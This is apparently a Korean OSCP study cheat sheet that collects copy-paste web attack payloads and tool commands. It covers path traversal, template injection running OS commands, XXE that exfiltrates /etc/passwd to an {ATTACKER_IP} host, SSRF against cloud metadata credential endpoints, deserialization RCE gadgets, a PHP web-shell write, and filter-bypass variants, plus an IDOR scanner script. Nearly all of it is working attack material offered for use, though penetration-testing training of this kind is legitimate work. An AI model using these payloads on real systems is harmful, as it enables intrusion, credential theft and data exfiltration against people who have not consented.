# Common Web Exploits - OSCP 공격 가이드

> **목표: OSCP에서 자주 나오는 웹 취약점들을 빠르게 식별하고 익스플로잇**

## ⚡ 기본 페이로드들 (즉시 복사-붙여넣기)

### 🔍 Directory Traversal (Path Traversal)

```bash
# 기본 디렉토리 순회
../../../../../../../etc/passwd
../../../../../../../etc/shadow
../../../../../../../windows/system32/drivers/etc/hosts
../../../../../../../windows/win.ini

# URL 인코딩
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

# 16비트 유니코드 인코딩
..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd

# 백슬래시 (Windows)
..\..\..\..\..\..\..\windows\system32\config\sam
..\..\..\..\..\..\..\boot.ini

# Null byte (구버전)
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.jpg
```

### 🔥 Server-Side Template Injection (SSTI)

```python
# Jinja2 (Python/Flask)
{{7*7}}
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').system('whoami')}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.setCache(false)}}{{include("php://filter/convert.base64-encode/resource=/etc/passwd")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
<#assign classloader=object?class?protectionDomain?codeSource?location?toExternalForm()?replace("file:/","","i")?replace("jar!/","","i")>

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))

# Smarty (PHP)
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### 🌐 XXE (XML External Entity)

```xml
# 기본 파일 읽기
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Windows 파일 읽기
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
<root>&xxe;</root>

# 내부 네트워크 스캔
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:80/">]>
<root>&xxe;</root>

# SSRF via XXE
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>

# Blind XXE (Out-of-band)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{ATTACKER_IP}:8080/xxe.dtd"> %xxe;]>
<root></root>

# xxe.dtd 파일 내용:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{ATTACKER_IP}:8080/data?x=%file;'>">
%eval;
%exfiltrate;
```

### 🔒 LDAP Injection

```bash
# 기본 LDAP 인젝션
admin)(&(password=*))
*)(cn=*))(|(cn=*
*))%00

# 인증 우회
admin*)(&(objectclass=*))(&(cn=*
*)(|(password=*)
admin)(&(|(objectclass=*)))

# 블라인드 LDAP 인젝션 (참/거짓 구분)
admin)(&(password=a*))
admin)(&(password=b*))
admin)(&(password=c*))

# 와일드카드 활용
*
admin*
*admin*
a*
```

### 🌍 Server-Side Request Forgery (SSRF)

```bash
# 내부 서비스 접근
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:3306
http://localhost:8080
http://0.0.0.0:80

# 내부 네트워크 스캔
http://192.168.1.1:80
http://10.0.0.1:80
http://172.16.0.1:80

# AWS 메타데이터 접근
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud 메타데이터
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure 메타데이터
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# 파일 접근
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## 🎯 상황별 페이로드

### 🔐 Insecure Direct Object Reference (IDOR)

```bash
# 기본 IDOR 테스트
/user/profile?id=1
/user/profile?id=2
/user/profile?id=100
/api/user/123
/api/user/456

# 다른 파라미터명 시도
/user/profile?user_id=1
/user/profile?userid=1
/user/profile?uid=1
/user/profile?account=1

# 인코딩된 ID
/user/profile?id=MQ==  # Base64 인코딩된 1
/user/profile?id=Mg==  # Base64 인코딩된 2

# 다른 형식의 ID
/user/profile?id=admin
/user/profile?id=administrator
/user/profile?id=root
/user/profile?email=admin@company.com

# UUID 형식 추측
/api/user/00000000-0000-0000-0000-000000000001
/api/user/550e8400-e29b-41d4-a716-446655440000
```

### 📝 HTTP Parameter Pollution (HPP)

```bash
# ASP.NET / IIS (마지막 값 사용)
?param=value1&param=value2

# PHP / Apache (첫 번째 값 사용)
?param=value1&param=value2

# Perl / Apache (모든 값 배열로)
?param=value1&param=value2

# Python / Django (마지막 값 사용)
?param=value1&param=value2

# 인증 우회 예시
?user=admin&user=guest&action=delete
?role=user&role=admin&function=sensitive

# 필터 우회
?search=<script>&search=alert(1)&search=</script>
?input=../&input=../&input=../etc/passwd
```

### 🌐 Host Header Injection

```bash
# 기본 Host 헤더 조작
Host: evil.com
Host: {TARGET_IP}
Host: localhost

# 포트 스푸핑
Host: {TARGET_IP}:22
Host: {TARGET_IP}:3389
Host: {TARGET_IP}:8080

# 서브도메인 조작
Host: admin.{TARGET_DOMAIN}
Host: test.{TARGET_DOMAIN}
Host: dev.{TARGET_DOMAIN}

# X-Forwarded-Host 헤더
X-Forwarded-Host: evil.com
X-Forwarded-Host: admin.internal
X-Forwarded-For: 127.0.0.1

# 패스워드 리셋 공격
Host: attacker.com
# 패스워드 리셋 링크가 attacker.com으로 전송됨

# Cache Poisoning
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### 🔀 CRLF Injection

```bash
# HTTP Response Splitting
%0D%0ASet-Cookie:%20admin=true
%0D%0ALocation:%20http://evil.com

# 헤더 주입
%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK

# 로그 인젝션
admin%0D%0A127.0.0.1%20-%20admin%20[timestamp]%20"GET%20/admin%20HTTP/1.1"%20200

# 이메일 헤더 인젝션 (Contact Form)
test@example.com%0ABcc:attacker@evil.com
test@example.com%0D%0ABcc:attacker@evil.com%0D%0A

# Session Fixation
sessionid=fixed%0D%0ASet-Cookie:%20PHPSESSID=fixed
```

### 🔧 Deserialization 공격

```python
# Python Pickle
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = base64.b64encode(pickle.dumps(Evil()))
print(payload.decode())

# Java Deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64

# PHP Unserialize
O:8:"stdClass":1:{s:4:"test";s:6:"whoami";}

# .NET BinaryFormatter
# 바이너리 형태로 생성 후 Base64 인코딩

# Node.js node-serialize
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

## 🔄 우회 기법들

### 🚫 SSRF 필터 우회

```bash
# IP 주소 형식 변경
http://127.0.0.1  → http://127.1
http://127.0.0.1  → http://2130706433  (10진수)
http://127.0.0.1  → http://0x7f000001  (16진수)
http://127.0.0.1  → http://017700000001  (8진수)

# IPv6 형식
http://[::1]:80
http://[0:0:0:0:0:ffff:127.0.0.1]:80

# URL 인코딩
http://127.0.0.1  → http://%31%32%37%2e%30%2e%30%2e%31
http://localhost  → http://%6c%6f%63%61%6c%68%6f%73%74

# DNS Rebinding
http://1.1.1.1.evil.com  # evil.com이 127.0.0.1로 resolve
http://127.0.0.1.nip.io
http://localhost.localdomain

# Protocol 우회
dict://127.0.0.1:6379/info
gopher://127.0.0.1:3306/_%A3...
ftp://127.0.0.1/
file:///etc/passwd

# Redirect 우회
http://evil.com/redirect.php?url=http://127.0.0.1
```

### 🛡️ XXE 필터 우회

```xml
# DOCTYPE 대체
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</root>

# 대소문자 변경
<!DOCTYPE foo [<!entity xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY XXE SYSTEM "file:///etc/passwd">]>

# 인코딩 우회
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:/&#x2F;&#x2F;&#x2F;etc&#x2F;passwd">]>

# 다른 프로토콜
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>

# Parameter Entity
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % sp SYSTEM "http://{ATTACKER_IP}/xxe.xml">
%sp;
%param1;
]>
```

### 🔀 SSTI 필터 우회

```python
# Jinja2 필터 우회
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()|attr('__getitem__')(40)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").system("whoami")')}}

# 언더스코어(_) 필터링 우회
{{''['\x5f\x5fclass\x5f\x5f']}}
{{''['__class__'.replace('_','＿')]}}  # 전각문자 사용

# 점(.) 필터링 우회
{{''|attr('__class__')}}
{{''['__class__']}}

# request 객체 우회
{{self.__init__.__globals__}}
{{url_for.__globals__}}
{{get_flashed_messages.__globals__}}

# 키워드 필터링 우회
{{'o'+'s'|attr('system')}}
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['o'+'s'].system('whoami')}}
```

### 🔍 Directory Traversal 우회

```bash
# 더블 인코딩
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 16비트 유니코드
..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002f..%u002fetc%u002fpasswd

# 다양한 경로 구분자
..\../..\../..\../..\../..\../..\../etc/passwd
..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2f..%5c..%2fetc%2fpasswd

# 중복 슬래시
../../../../../../../etc//passwd
../../../../../../../etc/./passwd
../../../../../../../etc/passwd/.

# 점 우회
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd

# Null byte (구버전)
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.txt
../../../../../../../etc/passwd\x00
```

## 🤖 자동화 도구 명령어

### 🔍 SSRF 탐지 도구

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan --lhost 127.0.0.1 --lport 22,80,443,3306
python3 ssrfmap.py -r request.txt -p url -m aws

# Gopherus (SSRF → RCE)
python2 gopherus.py --exploit mysql
python2 gopherus.py --exploit redis
python2 gopherus.py --exploit smtp
python2 gopherus.py --exploit zabbix

# 수동 SSRF 테스트
curl -X POST -d "url=http://127.0.0.1:22" http://{TARGET_IP}/ssrf.php
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" http://{TARGET_IP}/ssrf.php
```

### 🔥 Template Injection 도구

```bash
# TPLMap
python2 tplmap.py -u "http://{TARGET_IP}/page?name=test"
python2 tplmap.py -u "http://{TARGET_IP}/page" --data "name=test"
python2 tplmap.py -u "http://{TARGET_IP}/page?name=test" --engine jinja2
python2 tplmap.py -u "http://{TARGET_IP}/page?name=test" --os-shell

# 수동 테스트
curl "http://{TARGET_IP}/page?name={{7*7}}"
curl "http://{TARGET_IP}/page?name={{config}}"
curl -X POST -d "template={{7*7}}" http://{TARGET_IP}/render
```

### 🌐 XXE 자동화

```bash
# XXEinjector
ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8080 --file=/etc/passwd --path=/request
ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8080 --expect=id --path=/request
ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8080 --upload=/root/xxe.xml --path=/request

# Burp Suite XXE 확장
# Content Type Converter - XML 자동 변환
# Freddy - Deserialization 및 XXE 탐지

# 수동 XXE 테스트
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://{TARGET_IP}/xml
```

### 🔧 다중 취약점 스캐너

```bash
# Nuclei (다양한 웹 취약점)
nuclei -u http://{TARGET_IP} -t nuclei-templates/vulnerabilities/
nuclei -u http://{TARGET_IP} -t nuclei-templates/cves/
nuclei -u http://{TARGET_IP} -t nuclei-templates/exposures/

# Wapiti
wapiti -u http://{TARGET_IP} --flush-attacks
wapiti -u http://{TARGET_IP} -m "xxe,ssrf,exec,file"

# OWASP ZAP
zap-cli quick-scan http://{TARGET_IP}
zap-cli active-scan http://{TARGET_IP}
zap-cli spider http://{TARGET_IP}
```

### 🐍 커스텀 IDOR 스캐너

```python
#!/usr/bin/env python3
import requests
import sys

def test_idor(base_url, param, session_cookie):
    # IDOR 테스트할 ID 범위
    test_ids = list(range(1, 101))  # 1-100
    test_ids.extend(['admin', 'administrator', 'root', 'test'])

    headers = {'Cookie': f'session={session_cookie}'} if session_cookie else {}

    print(f"[+] Testing IDOR on: {base_url}?{param}=ID")

    baseline_response = None
    try:
        # 기준점 응답 (존재하지 않는 ID)
        r = requests.get(f"{base_url}?{param}=99999", headers=headers, timeout=10)
        baseline_length = len(r.content)
        baseline_status = r.status_code
    except:
        baseline_length = 0
        baseline_status = 404

    found_objects = []

    for test_id in test_ids:
        try:
            r = requests.get(f"{base_url}?{param}={test_id}", headers=headers, timeout=10)

            # 응답 길이나 상태코드가 기준점과 다른 경우
            if (r.status_code != baseline_status or
                abs(len(r.content) - baseline_length) > 50):

                print(f"[FOUND] ID: {test_id} - Status: {r.status_code} - Length: {len(r.content)}")
                found_objects.append(test_id)

                # 민감한 키워드 확인
                sensitive_keywords = ['admin', 'password', 'email', 'phone', 'ssn', 'credit']
                for keyword in sensitive_keywords:
                    if keyword in r.text.lower():
                        print(f"[SENSITIVE] ID {test_id} contains: {keyword}")

        except Exception as e:
            print(f"[-] Error testing ID {test_id}: {e}")

    return found_objects

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 idor_test.py <base_url> <parameter> [session_cookie]")
        print("Example: python3 idor_test.py 'http://target.com/profile' id 'abc123'")
        sys.exit(1)

    base_url = sys.argv[1]
    param = sys.argv[2]
    session_cookie = sys.argv[3] if len(sys.argv) > 3 else None

    found = test_idor(base_url, param, session_cookie)
    print(f"\n[+] Total accessible objects: {len(found)}")
```

## 🚨 문제 해결

### ❌ SSRF가 탐지되지 않을 때

```bash
# 1. 다른 프로토콜 시도
dict://127.0.0.1:6379/info
gopher://127.0.0.1:3306
ldap://127.0.0.1:389
tftp://127.0.0.1:69

# 2. DNS 기반 확인
http://burpcollaborator.com
http://{RANDOM}.{ATTACKER_DOMAIN}

# 3. 시간 기반 확인 (내부 서비스 응답 지연)
http://127.0.0.1:22  # SSH는 응답이 느림
http://127.0.0.1:25  # SMTP도 응답이 느림

# 4. 에러 메시지 차이
http://127.0.0.1:80      # 정상
http://127.0.0.1:99999   # 포트 닫힘
http://999.999.999.999   # 존재하지 않는 IP
```

### 🔍 XXE가 반응하지 않을 때

```xml
# 1. 다른 엔티티 방식
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</root>

# 2. Out-of-band 방식
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{ATTACKER_IP}/xxe.dtd">
%xxe;
]>
<root></root>

# 3. SOAP 래핑
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body>&xxe;</soap:Body>
</soap:Envelope>

# 4. 다른 XML 파서 타겟
# JSON → XML 변환 시도
# File upload에서 XML 파일 업로드
# API에서 Content-Type: application/xml 시도
```

### 🔧 SSTI가 실행되지 않을 때

```python
# 1. 다른 템플릿 엔진 시도
{{7*7}}    # Jinja2, Twig
${7*7}     # FreeMarker, Velocity
#{7*7}     # Spring EL
<%= 7*7 %> # ERB
{7*7}      # Smarty

# 2. 인코딩 우회
{{7*7}}  →  {{'7'*'7'}}
{{7*7}}  →  {{(7)*(7)}}

# 3. 다른 객체 접근
{{self}}
{{config}}
{{request}}
{{session}}
{{g}}

# 4. 함수 호출
{{url_for('/')}}
{{get_flashed_messages()}}
{{dict(a=1)}}
```

### 🚪 Directory Traversal이 막힐 때

```bash
# 1. 다른 방법으로 상위 디렉토리 접근
....//....//....//....//....//....//....//....//etc//passwd
....\/....\/....\/....\/....\/....\/....\/....\/etc\/passwd

# 2. 환경 변수 파일 읽기
../../../../../../../proc/self/environ
../../../../../../../proc/version
../../../../../../../proc/cmdline

# 3. 웹 서버 설정 파일
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/nginx/error.log
../../../../../../../etc/apache2/sites-enabled/000-default

# 4. 애플리케이션 설정 파일
../../../../../../../var/www/html/config.php
../../../../../../../var/www/html/.env
../../../../../../../home/user/.bashrc
```

### 🔒 IDOR 접근이 제한될 때

```bash
# 1. 다른 HTTP 메소드
GET /api/user/1    →  PUT /api/user/1
GET /api/user/1    →  DELETE /api/user/1
GET /api/user/1    →  PATCH /api/user/1

# 2. 다른 파라미터 위치
/api/user/1        →  /api/user?id=1
/user/profile?id=1 →  /user/1/profile

# 3. 인증 상태 변경
# 로그아웃 후 시도
# 다른 계정으로 로그인 후 시도
# 세션 쿠키 제거 후 시도

# 4. API 버전 변경
/v1/api/user/1
/v2/api/user/1
/api/v1/user/1
```

### 🌐 Host Header Injection이 안될 때

```bash
# 1. 다른 헤더들 시도
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
Forwarded: host=evil.com
X-Real-IP: 127.0.0.1

# 2. 포트 번호 추가
Host: evil.com:80
Host: {TARGET_IP}:8080
Host: localhost:3000

# 3. 대소문자 변경
host: evil.com
HOST: evil.com
Host: EVIL.COM

# 4. 특수문자 삽입
Host: evil.com%0d%0aSet-Cookie: admin=true
Host: evil.com%20
Host: evil.com%09
```

## 📊 성공 판정 기준

### ✅ SSRF 성공 확인

- **내부 서비스 접근**: 22(SSH), 3306(MySQL), 6379(Redis) 등 배너 정보
- **파일 읽기**: file:// 프로토콜로 /etc/passwd 등 내용 확인
- **메타데이터 접근**: AWS/GCP/Azure 메타데이터 서비스 응답
- **DNS 요청**: 공격자 도메인으로 DNS 쿼리 수신

### ✅ XXE 성공 확인

- **파일 내용**: /etc/passwd, /etc/hosts 등 시스템 파일 내용 출력
- **Out-of-band**: HTTP 서버나 DNS 서버로 데이터 수신
- **에러 기반**: 파일 경로 에러 메시지에서 시스템 정보 유출

### ✅ SSTI 성공 확인

- **수식 계산**: {{7*7}} → 49, ${7\*7} → 49 등 계산 결과 출력
- **설정 정보**: {{config}} 출력으로 서버 설정 정보 확인
- **명령 실행**: whoami, id 등 시스템 명령어 결과 출력

### ✅ IDOR 성공 확인

- **다른 사용자 데이터**: 자신이 아닌 다른 사용자 정보 접근
- **권한 상승**: 일반 사용자로 관리자 데이터 접근
- **민감 정보**: 이메일, 전화번호, 주소 등 개인정보 노출

### ⏰ 시간 관리

- **5분**: SSRF + Directory Traversal 기본 테스트
- **15분**: XXE + SSTI + IDOR 확인
- **25분**: 우회 기법 + 자동화 도구 활용
- **30분**: Out-of-band 공격 + 복합 공격
- **실패시**: 다른 웹 취약점으로 전환

**연계 공격**: SSRF → 내부 서비스 공격, XXE → 파일 읽기, SSTI → RCE, IDOR → 권한 상승

## 💡 OSCP 실전 팁

- **SSRF**: AWS/클라우드 환경에서 메타데이터 서비스 필수 확인
- **XXE**: JSON API도 XML 변환 가능한지 확인
- **SSTI**: 404 에러 페이지, 검색 결과 등에서도 발견됨
- **IDOR**: API 엔드포인트에서 특히 자주 발견
- **복합 공격**: 여러 취약점 조합으로 시스템 접근 가능
